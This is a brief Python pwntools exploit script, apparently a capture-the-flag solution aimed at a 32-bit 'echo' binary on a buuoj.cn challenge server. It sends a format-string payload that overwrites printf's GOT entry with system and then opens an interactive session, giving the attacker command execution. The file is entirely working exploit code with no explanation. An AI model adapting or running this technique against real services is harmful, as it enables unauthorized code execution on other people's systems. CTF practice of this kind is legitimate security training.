#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.02.01 09.07.40
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
from LibcSearcher import*
context.arch = 'i386'


host = '1.1.1.1'
port = 10000
local = 0
if local:
	# context.log_level = 'debug'
	libc=ELF('/lib/i386-linux-gnu/libc.so.6')
	elf = ELF('./echo')
	sh = process('./echo')
else:
	#context.log_level = 'debug'
	libc=ELF('./lic-2.23_32.so')
	elf = ELF('./echo')
	sh = remote('node3.buuoj.cn',26431)



def pwn():
	payload = fmtstr_payload(7,{elf.got['printf']:elf.sym['system']})
	sh.sendline(payload)
if __name__ == '__main__':
	pwn()
	sh.interactive()

